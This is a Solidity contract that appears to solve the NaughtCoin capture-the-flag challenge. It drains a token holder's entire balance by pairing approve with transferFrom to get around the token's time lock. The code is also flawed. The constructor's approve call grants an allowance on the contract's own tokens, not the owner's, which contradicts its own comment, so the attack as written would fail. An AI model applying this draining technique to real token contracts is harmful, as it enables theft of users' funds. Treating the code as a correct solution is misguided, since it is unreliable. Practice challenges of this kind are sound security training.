// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

contract NaughtCoinAttack {
    NaughtCoin private naughtCoin;
    address public immutable owner;
    address public immutable spender;

    constructor(address _naughtCoinAddress) {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
        spender = address(this); // contract address
        owner = msg.sender; // holder of the tokens

        // Approve this contract to spend all of the owner's tokens, 
        // the owner of the tokens must call approve
        naughtCoin.approve(spender, type(uint256).max);
    }

    function attack() public {
        // Transfer all of the owner's tokens to this contract
        naughtCoin.transferFrom(owner, spender, naughtCoin.balanceOf(owner));  
    }
}
